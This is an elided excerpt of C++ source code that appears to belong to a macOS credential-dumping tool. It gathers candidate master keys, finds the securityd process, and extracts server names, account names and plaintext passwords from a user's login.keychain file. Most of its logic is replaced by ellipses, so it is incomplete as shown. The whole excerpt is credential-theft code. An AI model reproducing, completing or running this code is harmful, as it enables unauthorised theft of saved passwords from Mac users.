...
UserCreds::UserCreds(string server, string uname, string pass) {
    this->server = server;
    this->uname = uname;
    this->pass = pass;
}

string UserCreds::getServer() {
    return this->server;
}

string UserCreds::getUser() {
    return  this->uname;
}
...
void add_master_candidate(char *key) {
    if (!g_master_candidates) {
        g_master_candidates = (char**)malloc(MAX_MASTER_CANDIDATES * sizeof(char *));
    }
    ...
    if (g_master_candidates_count < MAX_MASTER_CANDIDATES) {
        char *newchar = (char*)malloc(24);
        memcpy(newchar, key, 24);
        g_master_candidates[g_master_candidates_count++] = newchar;
    } else {
...
int get_securityd_pid() {
    ...
    struct kinfo_proc *procs = (kinfo_proc*)malloc(sz);
...
t_credentials *find_or_create_credentials(char *label) {
    if (!g_credentials) {
        ...
        g_credentials = (t_credentials*)malloc(sz);
    ...
    if (g_credentials_count < MAX_CREDENTIALS) {
        t_credentials *newchar = &g_credentials[g_credentials_count++];
        memcpy(newchar->label, label, 20);
        return newchar;
    } else {
...
void dump_credentials_data(char *record) {
    ...
    char *srvr = (char*)malloc(srvr_len + 1);
    char *acct = (char*)malloc(acct_len + 1);
...
void populateCredentials(vector<UserCreds>& ref) {
    if (!g_credentials) return;
    
    for (int i = 0; i < g_credentials_count; ++i) {
        t_credentials *cred = &g_credentials[i];
        if (!cred->account && !cred->server) continue;
        if (!strcmp(cred->account, "Passwords not saved")) continue;
        ref.push_back(UserCreds(string(cred->server), string(cred->account), string(cred->password)));
    }
}
...
vector<UserCreds> *get_credentials(string userName) {
    ...
    char filename[512];
    sprintf(filename, "/Users/%s/Library/Keychains/login.keychain", userName.c_str());
    ...
    vector<UserCreds> *ret = new vector<UserCreds>;
    populateCredentials(*ret);
